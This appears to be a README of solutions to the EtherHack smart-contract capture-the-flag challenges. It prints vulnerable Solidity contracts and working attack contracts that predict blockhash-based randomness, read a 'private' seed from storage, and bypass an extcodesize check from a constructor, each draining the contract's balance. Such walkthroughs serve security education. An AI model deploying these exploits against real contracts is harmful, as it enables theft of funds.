# ether-hack

### My Ether Hack Solutions

# Challenge 1 : Azino 777

```Solidity
pragma solidity ^0.4.16;

contract Azino777 {

  function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - 1;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
```

Solution : Challenge 1
---
We will win this lottery if generated random number and bet both are the same then we will win this, for this make contract and calculate first your `rand` function and get the return value and make the spin call with `0.01 ether` and `100` as max, Here's Your Full Code.

```solidity
contract Attack {
    Azino777 azino = Azino777("Azino777_ADDRESS");
    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;

  function solve(uint256 max) public payable {
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - 1;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));
    uint256 bet =  uint256((uint256(hashVal) / factor)) % max;
    azino.spin.value(msg.value)(bet);
  }

  function withdraw() public {
       msg.sender.transfer(address(this).balance);
  }

   function() public payable {}

}
```

# Challenge 2: Private Ryan

```solidity
pragma solidity ^0.4.16;

contract PrivateRyan {
  uint private seed = 1;

  function PrivateRyan() {
    seed = rand(256);
  }

  function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    seed = rand(256);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 blockNumber = block.number - seed;
    uint256 hashVal = uint256(block.blockhash(blockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
```

Solution : Challenge 2
---
Same as the last one but here we need seed which is private deploy the Private ryan contact and whichever network you are one use web3.js lib 
```
await web3.eth.getStorageAt("CONTRACT_ADDRESS",0);
```
it will give you hex value convert it into the dec and then rest is simple here is full code replace value.

```solidity
contract Attack {
    PrivateRyan privateRyan = PrivateRyan("PrivateRyan_ADDRESS");
     uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
     uint256 seed = YOUR_SEED_IN_DEC;


    function rand(uint256 max) public payable{
    uint256 factor = FACTOR * 100 / max;
    
   
    uint256 blockNumber = block.number - seed;
    uint256 hashVal = uint256(block.blockhash(blockNumber));

    uint256 bet=   uint256((uint256(hashVal) / factor)) % max;

    privateRyan.spin.value(msg.value)(bet);
    }

    function withdraw() public {
        msg.sender.transfer(this.balance);
    }

      function() public payable {}
}
```
# Challenge 3: WheelOfFortune

```solidity
pragma solidity ^0.4.16;

contract WheelOfFortune {
  Game[] public games;

  struct Game {
      address player;
      uint id;
      uint bet;
      uint blockNumber;
  }

  function spin(uint256 _bet) public payable {
    require(msg.value >= 0.01 ether);
    uint gameId = games.length;
    games.length++;
    games[gameId].id = gameId;
    games[gameId].player = msg.sender;
    games[gameId].bet = _bet;
    games[gameId].blockNumber = block.number;
    if (gameId > 0) {
      uint lastGameId = gameId - 1;
      uint num = rand(block.blockhash(games[lastGameId].blockNumber), 100);
      if(num == games[lastGameId].bet) {
          games[lastGameId].player.transfer(this.balance);
      }
    }
  }

  function rand(bytes32 hash, uint max) pure private returns (uint256 result){
    return uint256(keccak256(hash)) % max;
  }

  function() public payable {}
}
```

Solution : Challenge 3
---

Take look at the contract and you will see `rand(block.blockhash(games[lastGameId].blockNumber), 100)` it will become `uint256(keccak256(bytes32(0))) % max` you have to wait for the `256` Block to make next call [EVM Limitations](https://docs.soliditylang.org/en/v0.4.21/units-and-global-variables.html#block-and-transaction-properties), in this case which would be 47.

# Challenge 4 : CallMeMaybe

```solidity
pragma solidity ^0.4.16;

contract CallMeMaybe {
    modifier CallMeMaybe() {
      uint32 size;
      address _addr = msg.sender;
      assembly {
        size := extcodesize(_addr)
      }
      if (size > 0) {
          revert();
      }
      _;
    }

    function HereIsMyNumber() CallMeMaybe {
        if(tx.origin == msg.sender) {
            revert();
        } else {
            msg.sender.transfer(this.balance);
        }
    }

    function() payable {}
}
```

Solution : Challenge 4
---
Here's the modifier if `extcodesize` codesize check for the size of the code and if it `> 0` then it will revert remember at the construction time **contract does not source code at the construction time** so here's the Explotit code.

```solidity
pragma solidity ^0.4.16;
contract Attack {

    function Attack() public payable {
        CallMeMaybe callme = CallMeMaybe("CallMeMaybe_ADDRESS");
        callme.HereIsMyNumber();
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function() payable {}
}
```
# Challenge 5

```solidity
pragma solidity ^0.4.19;

contract PirateShip {
    address public anchor = 0x0;
    bool public blackJackIsHauled = false;

    function sailAway() public {
        require(anchor != 0x0);

        address a = anchor;
        uint size = 0;
        assembly {
            size := extcodesize(a)
        }
        if(size > 0) {
            revert(); // it is too early to sail away
        }

        blackJackIsHauled = true; // Yo Ho Ho!
    }

    function pullAnchor() public {
        require(anchor != 0x0);
        require(anchor.call()); // raise the anchor if the ship is ready to sail away
    }

    function dropAnchor(uint blockNumber) public returns(address addr) {
        // the ship will be able to sail away in 100k blocks time
        require(blockNumber > block.number + 100000);

        // if(block.number < blockNumber) { throw; }
        // suicide(msg.sender);

        uint[8] memory a;
        a[0] = 0x6300;      // PUSH4 0x00...
        a[1] = blockNumber; // ...block number (3 bytes)
        a[2] = 0x43;        // NUMBER
        a[3] = 0x10;        // LT
        a[4] = 0x58;        // PC
        a[5] = 0x57;        // JUMPI
        a[6] = 0x33;        // CALLER
        a[7] = 0xff;        // SELFDESTRUCT

        uint code = assemble(a);

        // init code to deploy contract: stores it in memory and returns appropriate offsets
        uint[8] memory b;
        b[0] = 0;             // allign
        b[1] = 0x6a;          // PUSH11
        b[2] = code;          // contract
        b[3] = 0x6000;        // PUSH1 0
        b[4] = 0x52;          // MSTORE
        b[5] = 0x600b;        // PUSH1 11 ;; length
        b[6] = 0x6015;        // PUSH1 21 ;; offset
        b[7] = 0xf3;          // RETURN

        uint initcode = assemble(b);
        uint sz = getSize(initcode);
        uint offset = 32 - sz;

        assembly {
            let solidity_free_mem_ptr := mload(0x40)
            mstore(solidity_free_mem_ptr, initcode)
            addr := create(0, add(solidity_free_mem_ptr, offset), sz)
        }

        require(addr != 0x0);
        anchor = addr;
    }

    ///////////////// HELPERS /////////////////

    function assemble(uint[8] chunks) internal pure returns(uint code) {
        for(uint i=chunks.length; i>0; i--) {
            code ^= chunks[i-1] << 8 * getSize(code);
        }
    }

    function getSize(uint256 chunk) internal pure returns(uint) {
        bytes memory b = new bytes(32);
        assembly { mstore(add(b, 32), chunk) }
        for(uint32 i = 0; i< b.length; i++) {
            if(b[i] != 0) {
                return 32 - i;
            }
        }
        return 0;
    }
}
```

Here's Great Write Up I Found On [Medium](https://blog.positive.com/phdays-8-etherhack-contest-writeup-794523f01248).
